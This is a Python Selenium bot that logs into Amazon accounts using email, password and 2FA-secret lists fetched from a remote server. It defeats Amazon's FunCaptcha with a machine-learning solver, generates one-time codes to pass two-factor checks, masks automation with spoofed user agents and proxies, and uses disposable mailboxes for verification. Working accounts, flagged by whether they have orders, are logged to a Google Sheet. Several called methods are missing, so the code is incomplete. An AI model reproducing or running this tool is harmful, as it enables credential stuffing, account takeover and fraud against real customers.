from utils.utils import *
from services.service import *
from model.process import predict_helper
# import lib
import requests
from PIL import Image
from selenium.webdriver.common.action_chains import ActionChains
from time import sleep
import random
import string
import numpy as np
import os
from skimage import transform
import pandas as pd
import numpy as np
import requests  # to get image from the web
import shutil  # to save it locally
import os
import threading
import random
import string
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, InvalidArgumentException, ElementNotInteractableException, ElementClickInterceptedException, StaleElementReferenceException
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from random import randint
from time import sleep
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.select import Select
from selenium.webdriver.firefox.options import Options
from PIL import Image, ImageOps
import ast
from random import uniform
from flask import Flask, request, jsonify, after_this_request, render_template

import gspread
from time import sleep
from datetime import datetime
gc = gspread.service_account("google-sheet-amz.json")

# Open a sheet from a spreadsheet in one go
wks  = gc.open_by_key("17NvFt9uvrsjpP8R3rmntjrrvfLKYTRC8kGiHthNWMcA").sheet1


def update_req_phone(value):
    for _ in range(10):
        try:
            values_list = wks.col_values(1)
            length = len(values_list)
            wks.update(f'A{length+1}',[[value]])
            break
        except Exception as e:
            print(e)
def update_die(value):
    for _ in range(10):
        try:
            values_list = wks.col_values(2)
            length = len(values_list)
            wks.update(f'E{length+1}',[[value]])
            break
        except Exception as e:
            print(e)
def update_live(value):
    for _ in range(10):
        try:
            values_list = wks.col_values(3)
            length = len(values_list)
            wks.update(f'F{length+1}',[[value]])
            break
        except Exception as e:
            print(e)

def update_live_order(value):
    for _ in range(10):
        try:
            values_list = wks.col_values(3)
            length = len(values_list)
            wks.update(f'F{length+1}',[[value]])
            break
        except Exception as e:
            print(e)

def get_amz_account_change_hot():
    for _ in range(10):
        try:
            r = requests.get("http://54.176.126.239:5000/api/getamzaccountchangehot?token=thang")
            if r.status_code == 200:
                return r.json()
        except:
            pass
    return {"status": False}

def get_two_fa_string(x):
    for v in x:
        if len(v) == 52:
            return v
    return None

user_agents = {}
user_agents["android"] = read_file_helper("./databases/user-agents/user-agents-android.txt")



proxy_data_list = read_file_helper("proxy_proxyguys.txt")


class SeleniumBot:
    def __init__(self,proxy = None,user_agent_option = None ,is_firefox = True):
        self.proxy = proxy
        self.is_firefox = is_firefox
        self.user_agent_option = user_agent_option


        self.home_page_url = "https://www.amazon.com/gp/css/homepage.html?ref_=nav_youraccount_btn"
        self.address_url = "https://www.amazon.com/a/addresses?ref_=ya_d_l_addr"
        self.address_info_f = None
        self.two_fa_string = None
    
    def init_selenium(self):
        try:
            if self.is_firefox:
                if self.proxy != None:
                    firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX
                    firefox_capabilities['marionette'] = True
                    firefox_capabilities['proxy'] = {
                        "proxyType": "MANUAL",
                        "httpProxy": self.proxy,
                        "ftpProxy": self.proxy,
                        "sslProxy": self.proxy
                    }
                #,capabilities=firefox_capabilities
                profile = webdriver.FirefoxProfile()
                if self.user_agent_option != None:
                    user_agent = user_agents[self.user_agent_option][randint(0,len(user_agents[self.user_agent_option])-1)]
                    print(user_agent)
                    profile.set_preference("general.useragent.override",user_agent)

                profile.set_preference("dom.webdriver.enabled", False)
                profile.set_preference("webdriver_enable_native_events", False)
                profile.set_preference("webdriver_assume_untrusted_issuer", False)
                profile.set_preference("media.peerconnection.enabled", False)
                profile.set_preference("media.navigator.permission.disabled", False)
                options = Options()
                options.headless = False 
                profile.update_preferences()
                self.driver = webdriver.Firefox(firefox_profile=profile,capabilities=firefox_capabilities) if self.proxy != None else webdriver.Firefox(options=options,firefox_profile=profile)
                self.driver.maximize_window()
                return True
        except Exception as e:
            print("Error: ",e)
            self.driver.quit()
            return False

    def switch_to_frame_helper(self,index = "",site = "amazon"):
        self.driver.switch_to_default_content()
        if site == "amazon":
            self.driver.switch_to_frame("cvf-arkose-frame")
        elif site == "gentoken":
            pass

        self.driver.switch_to_frame("fc-iframe-wrap")
        self.driver.switch_to_frame(f"CaptchaFrame{index}")


    def click_image_helper(self,image_index = 1,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                self.driver.find_element_by_id(f"image{image_index}").find_element_by_tag_name("a").click()
                return True
            except:
                index = 2
        return False

    def click_next_helper(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                self.driver.find_element_by_id("home_children_button").click()
                return True
            except:
                index = 2
        return False
    
    def get_game_text(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                return self.driver.find_element_by_id("game_children_text").text
            except:
                  index = 2
        return None
    
    def get_base64(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                imgstring = self.driver.find_element_by_tag_name("img").get_attribute("src")
                imgstring = imgstring.split("base64,")[-1]
                return imgstring
            except:
                index = 2
        return None

    def check_home_children_button(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                self.driver.find_element_by_id("home_children_button")
                return True
            except:
                index = 2
        return False
    def check_wrongTimeout_children_title(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                self.driver.find_element_by_id("wrongTimeout_children_title")
                return True
            except:
                index = 2
        return False

    def check_wrong_children_exclamation(self,index = ""):
        for _ in range(5):
            try:
                self.switch_to_frame_helper(index)
                self.driver.find_element_by_id("wrong_children_exclamation")
                return True
            except:
                index = 2
        return False

    def check_captcha_helper(self,timeout=15):
        for i in range(timeout):
            try:
                try:
                    self.driver.find_element_by_class_name("a-section.a-text-center.cvf-captcha-img")
                    return "CAPTCHA_LOL"
                except:
                    pass
                try:
                    self.driver.find_element_by_name("cvf_captcha_input")
                    return "CAPTCHA_LOL"
                except:
                    pass
                
                
                try:
                    self.driver.switch_to_default_content()
                    self.driver.find_element_by_id("cvf-input-code")
                    return False
                except:
                    pass
                
                if self.check_home_children_button():
                    self.click_next_helper()
                    return True
                if self.check_wrongTimeout_children_title():
                    self.click_try_again_time_out_helper()
                    sleep(1)
                    self.click_try_again_time_out_helper()
                    return True
                if self.check_wrong_children_exclamation():
                    self.click_try_again_whoops_helper()
                    sleep(1)
                    self.click_try_again_whoops_helper()
                    return True
                sleep(1)
            except Exception as e:
                print(e)
        return False

    def solving_captcha(self,timeout=60):
        is_funcaptcha = self.check_captcha_helper(timeout)
        if is_funcaptcha == "CAPTCHA_LOL":
            return "CAPTCHA_LOL"
        is_not_exits = False
        count = 0
        if is_funcaptcha:
            for _ in range(5):
                try:
                    self.check_captcha_helper(1)
                    sleep(2)
                    text = self.get_game_text()
                    if "galaxy" in text:
                        for _ in range(5):
                            self.driver.switch_to_default_content()
                            if "cvf/verify" in self.driver.current_url:
                                
                                try:
                                    self.driver.switch_to_default_content()
                                    self.driver.find_element_by_id("cvf-input-code")
                                    return True
                                except:
                                    pass
                                try:
                                    self.driver.find_element_by_id("cvf_phone_num")
                                    return False
                                except:
                                    pass
                                write_file_helper("amz_account_veryphone.txt",f"{self.email}|{self.paswd}")
                                return False
                            try:
                                try:
                                    self.driver.switch_to_default_content()
                                    self.driver.find_element_by_id("cvf-input-code")
                                    return True
                                except:
                                    pass
                                captcha_name = self.get_game_text().split(" ")[-1]
                                base64_string = self.get_base64()
                                print(captcha_name)
                                data = {"base64image":base64_string,"captcha_name":captcha_name}
                                res = predict_helper(data)
                                print(res)
                                if res["status"]:
                                    self.click_image_helper(res["index"])
                                    is_not_exits = True 
                                else:
                                    if not is_not_exits:
                                        count += 1
                                        if count == 2:
                                            self.driver.quit()
                                            return False
                                            
                                self.check_captcha_helper(1)
                            except Exception as e:
                                print(e)
                                sleep(1)
                    if "cvf/verify" in self.driver.current_url:
                        try:
                            #cvf_phone_num
                            self.driver.switch_to_default_content()
                            self.driver.find_element_by_id("cvf-input-code")
                            return True
                        except:
                            pass
                        try:
                            self.driver.find_element_by_id("cvf_phone_num")
                            
                            return False
                        except:
                            pass
                        write_file_helper("amz_account_veryphone.txt",f"{self.email}|{self.paswd}")
                        return False
                    self.check_captcha_helper(1)
                    try:
                        self.driver.switch_to_default_content()
                        self.driver.find_element_by_id("cvf-input-code")
                        return True
                    except:
                        pass
                except Exception as e:
                    if "cvf/verify" in self.driver.current_url:
                        try:
                            #cvf_phone_num
                            self.driver.switch_to_default_content()
                            self.driver.find_element_by_id("cvf-input-code")
                            return True
                        except:
                            pass
                        try:
                            self.driver.find_element_by_id("cvf_phone_num")
                            
                            return False
                        except:
                            pass
                        write_file_helper("amz_account_veryphone.txt",f"{self.email}|{self.paswd}")
                        return False
                    try:
                        self.driver.switch_to_default_content()
                        self.driver.find_element_by_id("cvf-input-code")
                        return True
                    except:
                        pass
                    print(e)
                    sleep(1)
        return True


    def wait_url(self,url = "account-setup/finish",timeout=30):
        self.driver.switch_to_default_content()
        for _ in range(timeout):
            if url in self.driver.current_url:
                return True
            sleep(1)
        return False


    def wait_element(self,element,name,timeout=30):
        for _ in range(timeout):
            try:
                WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((element, name)))
                return True
            except:
                try:
                    self.driver.find_element_by_id("nav-search-keywords")
                    return True
                except:
                    pass
        return False

    
    

    def handle_login(self):
        self.driver.get("https://www.amazon.com/")
        WebDriverWait(self.driver, 6).until(EC.presence_of_element_located((By.ID, 'nav-link-accountList'))).click()
        is_ok = False
        for _ in range(10):
            try:
                try:
                    self.driver.find_element_by_id("ap_email")
                    is_ok = True
                    break
                except:
                    self.driver.find_element_by_id("ap_email_login")
                    is_ok = True
                    break
            except:
                sleep(1)
        if is_ok:
            amz_account_change_hot = get_amz_account_change_hot()
            if amz_account_change_hot["status"]:
                self.data = amz_account_change_hot["data"]
                data_split = self.data.split("|")
                try:
                    WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'ap_email'))).send_keys(data_split[0])
                except:
                    WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'ap_email_login'))).send_keys(data_split[0])
                for e in self.driver.find_elements_by_id("continue"):
                    try:
                        e.click()
                    except:
                        pass
                sleep(randint(2,3))
                try:
                    WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'ap_password'))).send_keys(data_split[1])
                except:
                    WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'ap_password_login'))).send_keys(data_split[1])
                sleep(randint(1,2))
                WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.ID, 'signInSubmit'))).click()
                for _ in range(100):
                    try:
                        if "forgotpassword" in self.driver.current_url:
                            return False

                        WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'auth-mfa-otpcode')))
                        two_fa_string = get_two_fa_string(data_split)
                        res = get_2fa_code(two_fa_string)
                        if res["status"]:
                            WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'auth-mfa-otpcode'))).send_keys(res["token"])
                            WebDriverWait(self.driver, 1).until(EC.presence_of_element_located((By.ID, 'auth-signin-button'))).click()
                            return True
                    except:
                        pass
                return False
        return False
    def open_new_tab(self,url):
        self.driver.switch_to_window(self.driver.window_handles[0])
        self.driver.execute_script(f"window.open('{url}','_blank');")
        sleep(randint(4,7))
        self.driver.switch_to_window(self.driver.window_handles[-1])
        self.driver.close()
        self.driver.switch_to_window(self.driver.window_handles[0])

    def wait_otp_and_send_helper(self):
        email_raw = self.email.split("@")[0]
        domain = self.email.split("@")[1]

        url = f"http://www.fakemailgenerator.com/#/{domain}/{email_raw}/"
        self.open_new_tab(url)
        message_id = None
        for _ in range(20):
            message_id = get_message_id(domain,email_raw)
            if message_id != None:
                print("DONEEEE")
                break
            else:
                self.driver.find_element_by_id("cvf-resend-link").click()
        if message_id != None:
            code_data = get_amz_code_fakemail(domain,self.email,message_id)
            if code_data["status"]:
                WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.NAME, 'code'))).send_keys(code_data["code"])
                WebDriverWait(self.driver, 6).until(EC.presence_of_element_located((By.CLASS_NAME, 'a-button-input'))).click()
                sleep(randint(3,5))
                
                question = WebDriverWait(self.driver, 20).until(EC.presence_of_element_located((By.CLASS_NAME, 'a-form-label'))).text
                print(question)
                if "full name" in question:
                    print("Succes")
                    WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.NAME, 'dcq_question_subjective_1'))).send_keys(self.name)
                    sleep(randint(1,2))
                    WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, 'a-button-input.notranslate'))).click()
                    return True
                elif "phone number" in question:
                    print("Fail")
                    update_req_phone(f"{self.name}|{self.email}")
                    write_file_helper("account_required_phone.txt",f"{self.name}|{self.email}")
        return False
    
    


    def check_order(self):
        for _ in range(3):
            try:
                if self.wait_url("nav_ya_signin"):
                    self.driver.get(self.home_page_url)
                    try:
                        WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, '//div[@data-card-identifier="YourOrders"]'))).click()
                    except:
                        pass
                    sleep(randint(2,3))
                    try:
                        WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, '//span[@data-action="a-dropdown-button"]'))).click()
                    except:
                        pass
                    sleep(randint(2,3))
                    WebDriverWait(self.driver, 5).until(EC.presence_of_all_elements_located((By.CLASS_NAME, 'a-dropdown-link')))[-1].click()
                    sleep(randint(2,3))
                    num_orders = int(WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, 'num-orders'))).text.split(" ")[0])
                    print(num_orders + " " + "orders")
                    if num_orders > 0:
                        # live_order
                        
                        print("LIVE WITH ORDER")
                        update_live_order(self.data)
                    else:        # live_non_order
                        print("LIVE")
                        update_live(self.data)
                    return
            except:
                pass
    
    

proxy_running = []

def bot_helper(proxy = None,user_agent_option = None ):
    self = SeleniumBot(proxy,user_agent_option)
    is_init = self.init_selenium()
    try:
        if is_init:
            is_done_handle_forgotpassword = self.handle_forgotpassword()
            if is_done_handle_forgotpassword:
                if self.solving_captcha() == True and self.solving_captcha() != "CAPTCHA_LOL":
                    is_done_wait_otp_and_send_helper = self.wait_otp_and_send_helper()
                    if is_done_wait_otp_and_send_helper:
                        is_handle_password  = self.handle_password()
                        if is_handle_password:
                            self.handle_change_info()
    except:
        pass
    self.driver.quit()


def run(api_key = None,number_of_threads = None,user_agent_option = None):
    global proxy_running
    thread_list = list()
    print("Key running : ",proxy_running)
    # 
    is_proxy_active = False
    for _ in range(120):
        try:
            tmproxy_data = tmproxy_api(api_key)
            if tmproxy_data['status']:
                proxy = tmproxy_data['proxy']
                if len(proxy) > 5:
                    is_proxy_active = True
                    break
            sleep(1)
        except Exception as e:
            print("Error tmproxy: ",e)
            sleep(1)

    
    if is_proxy_active:
        number_thread = number_of_threads
        for index in range(number_thread):
            t = threading.Thread(name='Email {}'.format(index), target=bot_helper, args=(proxy,user_agent_option))
            t.start()
            sleep(5)
            thread_list.append(t)

        for thread in thread_list:
            thread.join()
    proxy_running.remove(api_key)


proxy_data_list = read_file_helper("proxy_key.txt")








def start_helper(data):
    global hotmail_data
    number_of_threads = int(data["number_of_threads"])
    user_agent_option = "android" if data["is_user_agent"] == "True" else None
    is_ok = False
    print(proxy_data_list,number_of_threads)
    for _ in range(1000000):
        for api_key in proxy_data_list:
            if not api_key in proxy_running:
                t = threading.Thread(target=run,args=(api_key,number_of_threads,user_agent_option))
                t.start()
                sleep(2)
                proxy_running.append(api_key)
        sleep(1)

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')


@app.route('/api/stop', methods=['POST'])
def stop():
    try:
        print("STOP")
        return jsonify({"status": 200, "message": "success"})
    except:
        return jsonify({"status": 400, "message": "fail"})

@app.route('/api/start', methods=['POST'])
def start():
    global data
    global is_active
    try:
        data = ast.literal_eval(request.form['data'])
        print(data)
        start_helper(data)
        return jsonify({"status": 200, "message": "success"})
    except Exception as e:
        print(e)
        return jsonify({"status": 400, "message": "fail"})


if __name__ == '__main__':
    app.run()
